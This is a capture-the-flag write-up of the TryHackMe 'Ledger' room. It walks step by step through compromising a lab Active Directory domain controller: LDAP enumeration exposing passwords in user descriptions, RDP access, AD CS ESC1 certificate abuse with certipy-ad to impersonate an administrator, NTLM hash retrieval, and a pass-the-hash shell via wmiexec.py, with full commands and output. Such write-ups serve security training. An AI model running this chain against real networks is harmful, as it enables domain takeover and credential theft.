---
layout: post
title:  "Ledger (TryHackMe) Writeup"
date:   2026-01-21 13:00:00 +0530
categories: [Cybersecurity, Active Directory, TryHackMe]
---

This write-up covers the Ledger TryHackMe room, which focuses on attacking a Windows Active Directory environment. The attack path begins with enumeration and credential discovery, followed by Active Directory enumeration and privilege escalation. The room highlights how misconfigurations in Active Directory Certificate Services (AD CS) can be abused to gain full administrative access.


**TryHackMe Room**: [Ledger](https://tryhackme.com/room/ledger)

## Enumeration 

Starting with the nmap scan . 

```
❯ nmap -p 1-10000 -Pn -sCV -O -T4 10.49.135.148
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 11:41 IST
Nmap scan report for labyrinth.thm.local (10.49.135.148)
Host is up (0.062s latency).
Not shown: 9985 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-21 06:13:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-21T06:14:33+00:00; -1m42s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-01-21T06:01:48
|_Not valid after:  2027-01-21T06:01:48
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2026-01-21T06:14:33+00:00; -1m42s from scanner time.
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-21T06:14:33+00:00; -1m42s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-01-21T06:01:48
|_Not valid after:  2027-01-21T06:01:48
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-01-21T06:01:48
|_Not valid after:  2027-01-21T06:01:48
|_ssl-date: 2026-01-21T06:14:33+00:00; -1m42s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-21T06:14:33+00:00; -1m42s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-01-21T06:01:48
|_Not valid after:  2027-01-21T06:01:48
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2026-01-20T06:10:46
|_Not valid after:  2026-07-22T06:10:46
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: LABYRINTH
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: labyrinth.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-01-21T06:14:13+00:00
|_ssl-date: 2026-01-21T06:14:33+00:00; -1m42s from scanner time.
9389/tcp open  mc-nmf        .NET Message Framing
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=1/21%OT=53%CT=1%CU=35704%PV=Y%DS=3%DC=I%G=Y%TM=69706F3
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=RD%CI=I%II=I%TS=U)SE
OS:Q(SP=103%GCD=1%ISR=10C%TI=RD%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=104%TI=RD%CI
OS:=RD%TS=U)SEQ(SP=109%GCD=1%ISR=10A%TI=RD%CI=RD%TS=U)SEQ(SP=FE%GCD=1%ISR=1
OS:05%TI=RD%CI=I%TS=U)OPS(O1=M4E8NW8NNS%O2=M4E8NW8NNS%O3=M4E8NW8%O4=M4E8NW8
OS:NNS%O5=M4E8NW8NNS%O6=M4E8NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF
OS:%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M4E8NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=80%CD=Z)

Network Distance: 3 hops
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1m41s, deviation: 0s, median: -1m42s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-21T06:14:13
|_  start_date: N/A

```

My findings from the Nmap scan concluded that the target is a Windows Server 2019 Active Directory Domain Controller for the domain `thm.local`, with the hostname `labyrinth.thm.local`. Services such as Kerberos, LDAP/LDAPS, SMB, and RPC were running. RDP was also enabled, indicating that remote access might be possible with valid credentials.

## LDAP Enumeration

After identifying LDAP as an exposed service, I attempted anonymous enumeration to check if user information could be retrieved without any credentials. So here, I used NetExec with the arbitrary credential value.

```
❯ nxc ldap 10.49.135.148 -u 'guest' -p '' --users
```

Guess what,  I actually found something interesting. Some user accounts had meaningful information in their description fields, including password-related notes, which i will be using to gain initial access. Sometimes storing sensitive information like passwords or hints in user descriptions is a common misconfiguration in Active Directory environments.

![](/assets/image/ledger/ldap%20enum.png)

I was able to identify two domain users whose description fields revealed the same password.

```
IVY_WILLIS         CHANGEME2023!
SUSANNA_MCKNIGHT   CHANGEME2023!
```

Next, I enumerated group memberships for both identified users using LDAP. While **IVY_WILLIS** authenticated successfully, the account did not belong to any privileged groups, so it confirms that it's a low-privileged Tier 1 user.

However our other user, **SUSANNA_MCKNIGHT** was a member of both **Remote Desktop Users** and **Remote Management Users**, confirming that this account has RDP permissions. 

```
❯ nxc ldap 10.49.135.148 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' --query "(sAMAccountName=SUSANNA_MCKNIGHT)" memberOf

LDAP        10.49.135.148   389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local)
LDAP        10.49.135.148   389    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023! 
LDAP        10.49.135.148   389    LABYRINTH        [+] Response for object: CN=SUSANNA_MCKNIGHT,OU=Test,OU=ITS,OU=Tier 1,DC=thm,DC=local
LDAP        10.49.135.148   389    LABYRINTH        memberOf             CN=Remote Management Users,CN=Builtin,DC=thm,DC=local
LDAP        10.49.135.148   389    LABYRINTH                             CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local

❯ nxc ldap 10.49.135.148 -u IVY_WILLIS -p 'CHANGEME2023!' --query "(sAMAccountName=IVY_WILLIS)" memberOf

LDAP        10.48.181.40    389    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 (name:LABYRINTH) (domain:thm.local)
LDAP        10.48.181.40    389    LABYRINTH        [+] thm.local\IVY_WILLIS:CHANGEME2023! 
LDAP        10.48.181.40    389    LABYRINTH        [+] Response for object: CN=IVY_WILLIS,OU=HRE,OU=Tier 1,DC=thm,DC=local

```

## Initial Access

Since **SUSANNA_MCKNIGHT** had RDP permissions, I attempted to connect to the target system using `xfreerdp3`.

```
❯ xfreerdp3 /v:10.49.135.148 /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /cert:ignore

```

On the desktop, I found a text file containing the **user flag**.

![](/assets/image/ledger/user%20flag.png)

## Post-Exploitation Enumeration

Next step, I verified the current user context and group memberships by running `whoami /all` in PowerShell.

![](/assets/image/ledger/admin%20user.png)

Now that we know our user is potentially related to Active Directory Certificate Services (AD CS), we can move on to using `certipy-ad`, a powerful tool for enumerating and abusing AD CS.

###  Enumeration w/ bloodhound

Performing further enumeration using bloodhound to better understand the domain structure and identify potential privilege escalation paths. Data collection was performed using NetExec with the compromised user credentials.

```
❯ nxc ldap 10.49.135.148 -u SUSANNA_MCKNIGHT -p CHANGEME2023! --bloodhound --collection All --dns-server 10.49.135.148
```

The collected data was then analyzed in , which bloodhound, identify privileged users and group relationships, including domain administrators. This information became useful later when enumerating and abusing Active Directory Certificate Services (AD CS).

During this process, the **Administrator** account was not accessible even after dumping its hash. As a result, I shifted focus to other users within the **Administrators** group and discovered that **BRADLEY_ORTIZ’s hash** successfully authenticated, allowing further progress.

![](/assets/image/ledger/group.png)

## AD CS Enumeration

At this stage, I used `certipy-ad` with the credentials of the user we had access to in order to identify vulnerable certificate templates. 

```
❯ certipy-ad find -dc-ip 10.49.135.148 -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -enabled -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'thm-LABYRINTH-CA' via RRP
[*] Successfully retrieved CA configuration for 'thm-LABYRINTH-CA'
[*] Checking web enrollment for CA 'thm-LABYRINTH-CA' @ 'labyrinth.thm.local'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-05-12T08:55:40+00:00
    Template Last Modified              : 2023-05-12T08:55:40+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Full Control Principals         : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Property Enroll           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : THM.LOCAL\Authenticated Users
                                          THM.LOCAL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

This revealed a vulnerable certificate template named `ServerAuth` and this template was flagged as vulnerable to `ESC1`, which can be abused to impersonate privileged users in the domain. 

Using `certipy-ad`, I requested a certificate as **BRADLEY_ORTIZ** while authenticating as **SUSANNA_MCKNIGHT**. Because **BRADLEY_ORTIZ** was a member of the **Administrators** group, this account was chosen as the target for impersonation.

Here, the ServerAuth template was specified using the `-template` flag, and the `-upn` option was used to impersonate BRADLEY_ORTIZ.

```
❯ certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' \
-p 'CHANGEME2023!' \
-dc-ip 10.49.135.148 \
-target 'labyrinth.thm.local' \
-ca 'thm-LABYRINTH-CA' -template 'ServerAuth' \
-upn 'BRADLEY_ORTIZ@thm.local'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'BRADLEY_ORTIZ@thm.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'bradley_ortiz.pfx'
[*] Wrote certificate and private key to 'bradley_ortiz.pfx'
```

The request was successful, and a certificate along with its private key was generated and saved locally as **`bradley_ortiz.pfx`**. This certificate could now be used to authenticate as **BRADLEY_ORTIZ** and escalate privileges.

```
❯ certipy-ad auth -pfx bradley_ortiz.pfx -dc-ip 10.49.135.148

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'BRADLEY_ORTIZ@thm.local'
[*] Using principal: 'bradley_ortiz@thm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bradley_ortiz.ccache'
[*] Wrote credential cache to 'bradley_ortiz.ccache'
[*] Trying to retrieve NT hash for 'bradley_ortiz'
[*] Got hash for 'bradley_ortiz@thm.local': aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d
```

After successfully requesting the certificate, I used it to authenticate as **BRADLEY_ORTIZ** using `certipy-ad auth`. The authentication was successful, and Certipy was able to obtain the **NTLM hash** for for **BRADLEY_ORTIZ** . 

## Privilege Escalation

After successfully retrieving the NTLM hash for **BRADLEY_ORTIZ**, I used **Pass-the-Hash** attack to gain a high-privileged shell on the target system using `wmiexec.py`. The authentication was successful . 

The Last step was navigating to the Administrator’s desktop and retrieving the **root flag**.

```
❯ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d THM.LOCAL/bradley_ortiz@10.49.135.148

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\bradley_ortiz

C:\>type C:\Users\Administrator\Desktop\root.txt
THM{THE_BYPASS_IS_C********}
C:\>[-] 

```
